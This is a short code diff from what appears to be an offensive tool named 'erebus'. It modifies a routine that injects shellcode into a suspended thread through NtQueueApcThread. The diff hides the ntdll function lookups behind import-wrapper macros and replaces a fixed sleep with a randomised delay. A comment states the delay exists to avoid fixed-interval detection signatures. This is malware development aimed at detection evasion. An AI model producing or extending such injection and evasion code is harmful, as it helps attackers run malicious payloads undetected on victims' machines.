@@ -9,11 +9,11 @@ namespace erebus {
 		PVOID base_address = NULL;
 		NTSTATUS status;
 
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
-		typeNtQueueApcThread NtQueueApcThread = (typeNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
-		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
-		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
+		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
+		ImportFunction(ntdll, NtClose, typeNtClose);
 
 		if (!shellcode || shellcode_size == 0)
 		{
@@ -50,8 +50,8 @@ namespace erebus {
 
 		LOG_SUCCESS("Thread resumed (previous suspend count: %lu)", suspend_count);
 
-		// Give APC time to execute
-		Sleep(1000);
+		// Jittered delay for APC execution — avoids fixed-interval detection signatures
+		Sleep(800 + (GetTickCount() % 400));
 
 		NtClose(hThread);
 		NtClose(hProcess);
